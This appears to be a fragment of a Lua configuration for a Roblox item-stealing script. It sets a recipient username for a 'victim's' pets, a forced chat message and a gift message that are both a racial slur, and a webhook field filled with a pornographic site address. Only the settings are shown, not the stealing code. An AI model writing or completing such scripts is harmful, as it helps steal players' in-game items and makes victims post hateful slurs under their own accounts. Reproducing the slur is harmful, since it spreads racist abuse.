...
_G.Username = "buckleshoe" --// Username To Send Pets To
_G.GiftMessage = "NIGGA" --// Message For The Gift To Say
_G.SendMessage = "NIGGA" --// Message the victim will send in the chat on execution
...
_G.Webhook = "https://pornhub.com" --// Discord Webhook URL
